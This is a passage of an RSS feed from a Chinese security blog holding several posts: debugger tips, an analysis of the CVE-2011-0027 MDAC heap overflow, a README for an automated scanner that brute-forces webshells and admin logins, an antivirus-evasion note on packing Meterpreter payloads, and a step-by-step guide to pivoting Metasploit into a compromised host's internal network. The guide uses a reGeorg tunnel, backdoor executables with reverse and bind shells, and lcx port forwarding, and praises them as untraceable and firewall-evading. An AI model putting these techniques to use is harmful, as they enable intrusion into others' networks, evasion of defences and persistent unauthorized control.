        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/25/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0774/</guid>
        
        <category>漏洞分析</category>
        
        <category>整数溢出</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>od命令</title>
        <description>&lt;h3 id=&quot;0x01-od知识&quot;&gt;0x01 OD知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;od调试常见断点及原理
    http://blog.csdn.net/qq_20977145/article/details/52687730
2&amp;gt;条件断点,条件记录断点
    http://blog.csdn.net/hgy413/article/details/7711925
    条件断点:shift+f2
    条件记录断点:shift+f4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-od技巧&quot;&gt;0x02 OD技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;如果有aslr,要调试某个exe,漏洞函数在某个dll中,可以先加载dll,然后在dll中的漏洞函数下断点,然后再加载要调试的exe
主程序,这样或许可以避开aslr对dll模块基址改变带来的问题从而更好地下断点,未实践.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 25 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/crack/2016/12/25/od%E5%91%BD%E4%BB%A4/</guid>
        
        <category>od</category>
        
        
        <category>crack</category>
        
      </item>
    
      <item>
        <title>漏洞战争-cve-2011-0027</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;p&gt;漏洞情况:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MDAC是一套用于在windows上提供数据库连接的组件,由于MDAC没有正确验证内部数据结构的内存分配,当RecordSet中用于
指定缓冲区大小的CacheSize属性过大时会导致整数溢出,造成实际分配的内存空间小于原来指定的内存空间.
荷兰黑客Peter Vreugdenhil在Pwn2Own 2010中利用cve-2011-0027 Microsoft Data Access Components(MDAC)的堆溢出漏
洞攻破了Windows7上的IE8,利用信息泄露和rop绕过aslr和dep的保护,赢得高额奖金. 微软于2011年1月补丁日修复这个漏
洞,对应微软信息安全公告MS11-002
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;准备:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在msf中search ms11-002或search cve-2011-0027都没有结果,这个漏洞要结合一个uaf漏洞来达到控制代码执行的目的,
msf中没有相关exp,google[site:exploit-db.com cve-2011-0027]或者在书中配套资料中可找到exp文件,该exp是个html
文件,对应exploit-db链接为:https://www.exploit-db.com/exploits/15984/

运行exploit-db中的exp,在win7x32+ie8和winXp(x32)+ie6下运行都失败,不能成功利用(代码中是弹出calc.exe),作者博客
中:
    http://vreugdenhilresearch.nl/ms11-002-pwn2own-heap-overflow/
提到:
    &quot;这当然需要你按照正确的顺序布局堆:[cachebuffer] [string] [objects]我设法做到这一点,它是工作和稳定的,
    当我在pwn2own机器上运行它,但它可能是只适用于特定的一个确切的IE8和Windows 7补丁版本

    另外:我只使用堆溢出的信息披露,但有足够的选项,将它变成RCE,至少对于WinXP,也可能为Windows 7.但对于实
    际的RCE我使用一个后免费的bug 几个月前补丁:
    http://www.microsoft.com/technet/security/bulletin/MS10-035.mspx

    我有几个版本的exp在我的硬盘,我不知道哪个是实际工作的最终版本,所以我只是把一个在这里.
    另外:我使用的DEP逃避是基于在pwn2opwn时与W7一起提供的msado.dll版本,基本上做了一个VirtualProtect调用我
    的Aligned堆喷雾,并把它可执行.

    记住,这是原始代码,它是在我很忙的时候写的,所以它是丑陋的,低效的,可能充满了奇怪的变量名. 此外,它需
    要Alex Sotirovs heapLib.js来运行.&quot;

很遗憾作者没有把通用的exp写出来或放出来,这里只学习其中的相关技术点
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-技术点&quot;&gt;0x01 技术点&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] 作者用的漏洞利用方法是通过在js中修改\00\00字符串终止符来越界访问对象的虚表指针的值来计算出模块基址然后构造
rop绕过dep,这里的技术点与下面链接中的第三个技术点相同,可参考下面链接
http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/

[+] 书中泉哥的分析漏洞的方法为经典的+hpa添加页堆的方法来分析,流程为:
a)+hpa
b)在windbg中得到中断位置为6887746f,具体如下:
6887746f 8906       mov     dword ptr [esi],eax ds:0023:088c8000=????????
c)此时要敏感地看看出错的内存位置是不是堆块中
!heap -p -a 88c8000分析发现出错的内存位置果然在堆块中,在该命令的结果中有关于这个堆块的栈信息,这应该是在这个堆块
在分配时的栈空间中esp附近的信息(被windbg保存了),通过查看!heap -p -a addr命令得到的与该堆块相关的栈中信息可以看
到函数调用过程,书中对应栈中数据大致为:
730d975d MSDART!MpHeapAlloc+0x00000029
6e5406e7 msado15!CRecordGroup::AllocateHRowRange+0x00000085
6e540650 msado15!CRecordset::PrepareForFetch+0x000000e2
...
这样的栈中数据可以判断出这个堆块在分配时依次调用过PrepareForFetch-&amp;gt;AllocateHRowRange-&amp;gt;MpHeapAlloc,因为在栈中的
数据为这三个函数的某个偏移(分别为+0x000000e2,+0x00000085,+0x00000029),说明在730d975d,6e5406e7,6e540650处的各个
对应的函数帧中的上一句汇编指令为call xxx格式的指令,这样才将call xxx指令的下一句指令的内存地址压栈,也即说明在堆
块分配时经历过这些函数

[+] UAF漏洞为&quot;释放后引用&quot;漏洞,发生在堆中,在free一块内存后,接着申请大小相同的一块内存,操作系统会将刚刚free掉的
内存再次分配给新申请的的动作,释放(free)的动作是为了再分配时可以预测新分配动作将得到的分配地址的情况,这样可以利
用js代码或其他方法将这个预测到的内存地址附近的内容修改为构造的内容,如果后面可以再引用(访问)释放的内存,这样就会
引用到被修改的内容,达到控制代码执行的目的.

[+] 汇编常见比较跳转指令小结如下:[AB无符号,GL有符号]
有符号指令    无符号指令    描述
JG            JA            大于则跳转
JNG           JNA           不大于则跳转
JGE           JAE           大于等于则跳转
JNGE          JNAE          不大于等于则跳转
JL            JB            小于则跳转
JNL           JNB           不小于则跳转
JLE           JBE           小于等于则跳转
JNLE          JNBE          不小于等于则跳转

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sat, 24 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0027/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/24/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0027/</guid>
        
        <category>整数溢出</category>
        
        <category>漏洞战争</category>
        
        <category>漏洞分析</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>3xp10it自动化渗透测试框架1.0</title>
        <description>&lt;h3 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] legal disclaimer: Usage of 3xp10it.py and web.py for attacking targets without prior mutual consent is 
illegal.It is the end user's responsibility to obey all applicable local, state and federal laws.Developers
assume no liability and are not responsible for any misuse or damage caused by this program.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;install&quot;&gt;Install&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/3xp10it/3xp10it.git
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash beforeWork.sh[这一步安装相关依赖,第一次使用本工具时需要运行,以后不用再运行]
python3 3xp10it.py[主程序,工作时运行,第一次运行时需要先运行上面的beforeWork.sh]
python3 web.py[可选,如果运行则要新开一个终端运行以便于查看相关输出信息,该工具为web后台]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;requirement&quot;&gt;Requirement&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;need python3
need pip3
mysql
works on linux(test on ubuntu and kali2.0,others not test)

python3安装可参考如下步骤:
	apt-get install python3
	或:
	wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tar.xz
	tar xJf Python-3.5.2.tar.xz
	cd Python-3.5.2
	./configure --prefix=/opt/python3
	make &amp;amp;&amp;amp; make install
	ln -s /opt/python3/bin/python3.5 /usr/local/bin/python3
	
pip3安装:
apt-get install -y python3-pip

kali linux2安装pip3可参考如下步骤:
	echo &quot;deb-src http://http.kali.org/kali kali main non-free contrib&quot; &amp;gt;&amp;gt; /etc/apt/sources.list
	echo &quot;deb-src http://security.kali.org/kali-security kali/updates main contrib non-free&quot; &amp;gt;&amp;gt;
/etc/apt/sources.list
	apt-get update
	apt-get install python3-pip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;a)3xp10it是一个自动化渗透测试框架,目前没有做到完全自动化[自动上传漏洞利用框架和自动fuzz框架暂时没有加入]&lt;/p&gt;

&lt;p&gt;b)支持功能列表&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;cdn真实ip查找模块&lt;/li&gt;
  &lt;li&gt;旁站获取[如果在cdn模块中发现有cdn但是没有获取到真实ip则不进行旁站获取]&lt;/li&gt;
  &lt;li&gt;子站获取&lt;/li&gt;
  &lt;li&gt;高危漏洞扫描模块&lt;/li&gt;
  &lt;li&gt;爬虫模块&lt;/li&gt;
  &lt;li&gt;目标网站脚本类型检测&lt;/li&gt;
  &lt;li&gt;目录扫描模块&lt;/li&gt;
  &lt;li&gt;sqli扫描模块&lt;/li&gt;
  &lt;li&gt;robots/sitemap自动收集&lt;/li&gt;
  &lt;li&gt;cms识别与cms漏洞扫描模块&lt;/li&gt;
  &lt;li&gt;自动识别管理员页面并爆破[支持自动识别简单验证码]&lt;/li&gt;
  &lt;li&gt;webshell自动查找与爆破,支持asp,php,aspx,jsp,支持chopper一句话webshell和大马类型webshell&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)apache,iis,nginx,lighttpd在phpstudy中测试默认可接收1000个post参数  
b)一句话类型webshell根据上面的特点可以正常情况下(单线程)的1000倍速度来爆破,可用大字典爆破,但是不能用多线程,
  可能是因为用多线程会太快而让web server觉得每次的参数不止1000个  
c)其他类型web server未测试,暂用多线程1倍速爆破,用最常用的webshell较小字典,17659个左右  
d)大马类型webshell由于表单名是一定的,所以不能以1000倍速爆破,于是也用和c)中一样的小字典多线程1倍速爆破  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;资源文件收集&lt;/li&gt;
  &lt;li&gt;端口扫描模块&lt;/li&gt;
  &lt;li&gt;whois信息收集&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;c)可选工作模式&lt;/p&gt;

&lt;p&gt;模式一:扫描目标和目标的所有旁站&lt;br /&gt;
模式二:扫描目标和目标的所有子站&lt;br /&gt;
模式三:扫描目标和目标的所有旁站和所有子站&lt;br /&gt;
模式四:只扫描目标&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;默认使用模式一扫描[在运行3xp10it后可自选],上面四种模式中的[扫描目标]里的目标支持批量导入多个目标和手工录入多个
目标.四种工作模式中与旁站和子站相关的由程序自动完成[eg.选择模式三工作时,将自动获取导入的目标的所有旁站和所有子
站,并对这些旁站和子站依次遍历上面的各个扫描模块]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;d)特点&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;可在中断后重新运行时从断点附近接着上次的过程扫描,不用重新扫描&lt;/li&gt;
  &lt;li&gt;运行3xp10it后自动从数据库中取出待完成的扫描任务进行扫描&lt;/li&gt;
  &lt;li&gt;支持正常扫描和优先扫描两个扫描组,如果优先扫描组里有任务则先扫描优先扫描组里的目标,在添加任务时可选择将目标是
正常扫描还是优先扫描&lt;/li&gt;
  &lt;li&gt;上述支持功能列表中的功能默认全部遍历扫描,如果要使用单个模块可在web界面使用&lt;/li&gt;
  &lt;li&gt;3xp10it配备一个web后台,web页面可查询当前扫描结果与使用单个模块功能&lt;/li&gt;
  &lt;li&gt;3xp10it独立于web运行,也即没有目录下的pannel文件夹也可运行&lt;/li&gt;
  &lt;li&gt;目录下的pannel文件夹是Django为3xp10it写的一些相关界面,web界面使用在下面介绍&lt;/li&gt;
  &lt;li&gt;支持找到高危漏洞邮件通知[eg.sqli,webshell爆破成功等]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;e)web后台说明&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;web后台如下图,需要管理员身份登录才可进后台
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/login.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/web.png&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;web后台相当于3xp10it的部分界面+分割的模块化工具+exp10it中没有的功能的附加工具的集合&lt;/li&gt;
  &lt;li&gt;web后台由Django==1.10.3开发&lt;/li&gt;
  &lt;li&gt;web后台中支持工具列表
    &lt;ul&gt;
      &lt;li&gt;targets:查看扫描目标,新增/删除扫描目标&lt;/li&gt;
      &lt;li&gt;获取旁[子]站:获取旁站或子站模块&lt;/li&gt;
      &lt;li&gt;xcdn:尝试识别cdn背后的真实ip&lt;/li&gt;
      &lt;li&gt;高危漏扫:高危漏洞扫描模块&lt;/li&gt;
      &lt;li&gt;sqli:sql注入模块&lt;/li&gt;
      &lt;li&gt;扫目录:目录扫描模块&lt;/li&gt;
      &lt;li&gt;cms漏扫:cms漏洞扫描模块&lt;/li&gt;
      &lt;li&gt;webshell爆破:webshell爆破模块&lt;/li&gt;
      &lt;li&gt;管理员登录爆破:管理员登录爆破模块&lt;/li&gt;
      &lt;li&gt;waf爆破:waf自动爆破模块[3xp10it中没有这个功能]&lt;/li&gt;
      &lt;li&gt;dbquery:数据库语句执行接口&lt;/li&gt;
      &lt;li&gt;扫描结果:查看当前扫描结果&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.3xp10it需要用到bingapi,需要先申请好bingapi
2.上面的web.py不一定要运行,核心功能在3xp10it.py文件中
3.如果要后台功能需运行python3 web.py
4.如果要使用web.py,重新开机后需要重新运行web.py
5.运行web.py常见错误:端口被占用.解决方法:
a)netstat -ntlp | grep 8000
b)在a)中找到pid后kill -9 pid
c)重新运行python3 web.py
6.3xp10it中调用的是关键模块exp10it中的exp10itScanner,exp10it模块由pip3 install exp10it安装,安装路径一般如下:
/usr/local/lib/python3.5/dist-packages
7.文件分布结构如下:

当前目录
.
├── 3xp10it.py
├── pannel
│   ├── ghostdriver.log
│   ├── manage.py
│   ├── models.py[web后台没有用django的模型]
│   ├── pages[web页面的html文件,相当于django的template]
│   └── pannel[django相关文件]
│       ├── __init__.py
│       ├── settings.py
│       ├── urls.py[django配置的访问与响应规则]
│       ├── views.py[django配置的关键函数]
│       └── wsgi.py
├── readme.md
├── uninstall.py
└── web.py


/usr/local/lib/python3.5/dist-packages路径下相关文件

├── cms_identify[cms识别模块相关文件]
├── cms_scan[cms漏洞扫描模块相关文件]
├── config.ini[配置文件]
├── dicts[字典文件]
├── dirsearch[目录扫描模块相关文件]
├── exp10it.py[关键模块文件]
├── exps[exp模块相关文件]
├── log[日志文件夹]
├── tools[web后台中的各个工具]

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;faq&quot;&gt;FAQ&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Q0:config.ini 这个文件怎么没有找到?
A0:config.ini在python3 3xp10it.py初次运行后会自动生成,用于设置bing API key,发邮件的帐号,数据库连接配置,扫描模式
   等信息,一般会在/usr/local/lib/python3.5/dist-packages/config.ini这里,与python3的安装路径有关
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;todo&quot;&gt;Todo&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;changelog&quot;&gt;Changelog&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] 修改exp10it.py中create table %s为create table `%s`[包括其他关于表名处的%s全部换成`%s`],如果没有``将会在表名
    为abc-def格式(中间有-符号)情况下建表失败
[+] 在与获取旁站有关的功能上自动尝试获取cdn后真实ip再获取旁站,如果确定有cdn但是没有获取到真实ip则不再获取假的旁
    站
[+] webshell爆破速度提升1000倍(接地气思路,适用于一句话类型webshell)
[+] 2017-01-06 添加支持如http://127.0.0.1/administrator页面的爆破,实际上http://127.0.0.1/administrator并不是
    直接的管理员页面,在浏览器中输入http://127.0.0.1/administrator后会跳转到&quot;http://127.0.0.1/administrator/&quot;,
    这才是有效的待爆破的管理员页面
[+] 2017-01-08 whois信息收集模块完善
[+] 2017-01-08 添加端口扫描模块
[+] 2017-01-08 cdn模块调整
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 23 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/23/3xp10it%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B61.0/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/23/3xp10it%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B61.0/</guid>
        
        <category>web</category>
        
        <category>scan</category>
        
        <category>framework</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>免杀</title>
        <description>&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://green-m.github.io/2016/11/15/meterpreter-bypass-av/

2.http://down.52pojie.cn/Tools/Packers/中WinLicense_x32_x64_v2.3.9.0_Repacked.7z加壳后可成功bypass av,其他壳目
前未测试,应该有几个也可以,如果一个壳不行则加多个壳

3.需要使用lcx的时候可用plink代替lcx,plink不杀
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/21/%E5%85%8D%E6%9D%80/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E5%85%8D%E6%9D%80/</guid>
        
        <category>免杀</category>
        
        <category>bypass</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>代理msf进内网</title>
        <description>&lt;h3 id=&quot;0x01-场景&quot;&gt;0x01 场景&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.肉鸡网络为内网环境,假设肉鸡ip为192.168.130.111
2.肉鸡内网中有一台开启公网web服务机器,假设提供对应http://rouji.com,假设运行aspx
3.尝试将msf用肉鸡的内网代理来控制目标内网
4.msf控制端网络环境任意,可为内网,假设ip为192.168.3.166[此192.168与上面肉鸡的192.168不是同一个内网下的192.168]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-准备&quot;&gt;0x02 准备&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;步骤如下:
1.上传reGeorg的tunnel.aspx到http://rouji.com/tunnel.aspx
2.控制端本地运行:python reGeorg.py -u http://rouji.com/tunnel.aspx -p 1080
3.控制端[假设为kali系统]:
apt-get install tsocks
vi /etc/tsocks.conf配置server地址为127.0.0.1,端口为1080
tsocks msfconsole
4.两种控制模式:
a)reverse类型payload连接
b)bind类型payload连接
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-reverse类型payload&quot;&gt;0x03 Reverse类型payload&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个reverse类型的exe,如下设置:
payload: windows/shell/reverse_tcp
rhost: 192.168.130.111[肉鸡本身的内网ip]
lport: 1234
假设生成houmen.exe

2.将lcx和上面生成的houmen.exe上传到肉鸡192.168.130.111,运行:
lcx -listen 300 1234
houmen.exe

3.在控制端msf中运行:
use multi/handler
set payload windows/shell/bind_tcp
set rhost 192.168.130.111
set lport 300
run -j

上面3个步骤完成后即可成功连接肉鸡

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x04-bind类型payload&quot;&gt;0x04 Bind类型payload&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.用msf生成一个bind类型的exe,如下设置:
payload: windows/shell/bind_tcp
lport: 1111
假设生成houmen.exe

2.将houmen.exe上传到肉鸡192.168.130.111,运行:
houmen.exe

3.在控制端msf中运行:
use multi/handler
set payload windows/shell/bind_tcp
set rhost 192.168.130.111
set lport 1111
run -j

上面3个步骤完成后即可成功连接肉鸡
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x05-about&quot;&gt;0x05 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;优点:
1.两种houmen.exe都无法溯源
2.两种houmen.exe都可尝试用在目标网络环境有防火墙拦截规则下正常通信,将所有与肉鸡的通信流量变成控制端与肉鸡内网的一台
web服务器的正常通信
3.msf控制端可直接访问肉鸡内网所有资源(正常情况下要在控制一台肉鸡后将肉鸡设置为路由转发才由本地msf访问肉鸡内网)

遗憾:
就算是这样做,msf中的一些欺骗模块(eg.auxiliary/spoof/nbns/nbns_response)和其他的需要肉鸡设置为待访问资源的
模块(eg.各种ie漏洞模块)在目标内网环境中依然没有用,因为为msf使用目标内网代理只是增加了msf对目标内网的访问权限,并
没有使msf有目标内网其他机器可以访问msf的功能
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 21 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/12/21/%E4%BB%A3%E7%90%86msf%E8%BF%9B%E5%86%85%E7%BD%91/</guid>
        
        <category>msf</category>
        
        <category>proxy</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
